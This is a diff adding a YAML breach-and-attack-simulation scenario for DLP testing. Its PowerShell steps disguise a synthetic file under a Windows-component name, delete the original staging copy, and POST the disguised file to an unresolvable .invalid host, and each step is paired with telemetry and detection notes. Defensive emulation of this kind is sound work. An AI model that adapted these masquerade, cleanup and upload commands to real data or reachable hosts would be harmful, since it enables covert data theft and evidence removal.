@@ -1,0 +1,154 @@
+id: collection-masquerade-cleanup-exfil
+product_line: dlp
+name: Masqueraded Staging, Cleanup and Outbound Probe
+description: >
+  Telemetry-safe emulation of an adversary who hides staged data under a benign
+  name, removes the original staging copy, and then sends the disguised file out.
+  Covers file masquerading (T1036), staging cleanup (T1070.004), and the transfer
+  that follows. The file is synthetic [BAS-SIM] text, and no system file is
+  touched. Masquerading is done only inside a per-run folder under %TEMP%.
+
+  KILL CHAIN STAGES:
+    1. Masquerade  — copy a synthetic file to a benign-looking name (T1036)
+    2. Cleanup     — delete the original staging copy from this run only (T1070.004)
+    3. Upload      — POST the disguised file to an RFC-6761 .invalid host (T1048.003)
+
+  SAFETY: All files are synthetic and created by this run. Only files under this
+  run's %TEMP% folder are renamed or deleted. Destinations are .invalid and cannot
+  resolve. Windows only. Telemetry mode.
+author: Audspect Research
+executable: true
+local_check: false
+supported_os: [windows]
+tags:
+  - exfiltration
+  - masquerading
+  - anti-forensics
+  - dlp
+  - t1036
+  - t1070
+  - t1048
+  - mitre
+mitre_phases:
+  - defense-evasion
+  - exfiltration
+
+live_policy:
+  block_on_domain_controller: true
+  require_dc_reachable: false
+  max_spray_attempts: 0
+  spray_account_allowlist: []
+  execution_window: ""
+
+steps:
+
+  # ---------------------------------------------------------------------------
+  # Stage 1 — Masquerade (T1036)
+  # ---------------------------------------------------------------------------
+  - name: "Masquerade 1 — Benign-Name Copy of Synthetic Staging File (T1036)"
+    technique_id: T1036
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Copies one synthetic [BAS-SIM] text file to a benign-looking name ('WindowsUpdateCache.dat') in a per-run folder under %TEMP%. Only files this run created are touched. No system path is used."
+    telemetry:
+      - "Sysmon EID 11: benign-named file created under %TEMP%\\bas_mask_<runid>"
+    detection:
+      - "EDR: a data file named like a system component created outside a system path"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $work = Join-Path $env:TEMP "bas_mask_$runId"
+      New-Item -ItemType Directory -Path $work -Force | Out-Null
+      $orig = Join-Path $work 'synthetic_staging.txt'
+      Set-Content -Path $orig -Value "[BAS-SIM] synthetic staged data run=$runId - no real data" -Encoding UTF8
+      $disguised = Join-Path $work 'WindowsUpdateCache.dat'
+      Copy-Item -Path $orig -Destination $disguised -Force
+      $ok = Test-Path $disguised
+      Write-Output "EXEC T1036: copied the synthetic staging file to a benign name ($disguised, exists=$ok). Masquerade Stage 1. [BAS-SIM-MSK-S1]"
+      if ($ok) {
+        Write-Output "FAIL: A data file was renamed to mimic a Windows component with no alert. Benign-name masquerading should be flagged."
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 2 — Staging Cleanup (T1070.004)
+  # ---------------------------------------------------------------------------
+  - name: "Masquerade 2 — Remove Original Staging Copy (T1070.004)"
+    technique_id: T1070.004
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Deletes only the original synthetic_staging.txt from this run's folder, leaving the disguised copy. Adversaries remove the original staging artefact after copying. No file outside this run's folder is touched."
+    telemetry:
+      - "Sysmon EID 23: file delete under %TEMP%\\bas_mask_<runid>"
+    detection:
+      - "EDR: staging artefact deleted shortly after a disguised copy was made — cleanup IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $work = Join-Path $env:TEMP "bas_mask_$runId"
+      $orig = Join-Path $work 'synthetic_staging.txt'
+      if (-not (Test-Path $orig)) {
+        Write-Output "SKIP: T1070.004: no original staging file to remove. [BAS-SIM-MSK-S2]"
+        exit 0
+      }
+      Remove-Item -Path $orig -Force
+      $gone = -not (Test-Path $orig)
+      Write-Output "EXEC T1070.004: removed the original staging copy (removed=$gone). Disguised copy kept for Stage 3. Cleanup Stage 2. [BAS-SIM-MSK-S2]"
+      if ($gone) {
+        Write-Output "FAIL: The original staging artefact was deleted with no alert. Deleting staging data right after a disguised copy is an anti-forensics signal."
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 3 — Disguised Upload Attempt (T1048.003)
+  # ---------------------------------------------------------------------------
+  - name: "Masquerade 3 — Disguised File Upload Attempt to .invalid (T1048.003)"
+    technique_id: T1048.003
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "POSTs the disguised synthetic file to an RFC-6761 .invalid host over HTTP. The host cannot resolve, so nothing leaves the host. Generates Sysmon EID 22 and EID 3."
+    telemetry:
+      - "Sysmon EID 22: DNS query for the bas-sim .invalid host"
+      - "Proxy/egress log: POST of a file whose name does not match its content type"
+    detection:
+      - "Egress/DLP: a file whose name and extension mismatch its content is sent outbound"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $disguised = Join-Path $env:TEMP "bas_mask_$runId\WindowsUpdateCache.dat"
+      if (-not (Test-Path $disguised)) {
+        Write-Output "SKIP: T1048.003: no disguised file from Stage 1 to send. [BAS-SIM-MSK-S3]"
+        exit 0
+      }
+      $target = "http://bas-sim-msk-$runId.invalid/upload"
+      $reached = $false
+      try {
+        $r = Invoke-WebRequest -Uri $target -Method Post -InFile $disguised -ContentType 'application/octet-stream' -TimeoutSec 10 -UseBasicParsing
+        if ($r.StatusCode) { $reached = $true }
+      } catch { $reached = $false }
+      Write-Output "EXEC T1048.003: attempted HTTP POST of the disguised synthetic file to $target. reached=$reached (expected: false). Disguised upload Stage 3. [BAS-SIM-MSK-S3]"
+      if ($reached) {
+        Write-Output "FAIL: A disguised file was delivered to an unknown host. Egress controls are not checking name and content mismatch."
+      } else {
+        Write-Output "FAIL: The endpoint attempted to send a disguised file to an unknown host. Unreachable only because the domain is .invalid; the attempt is the signal egress should alert on."
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_mask_*') -Recurse -Force -ErrorAction SilentlyContinue
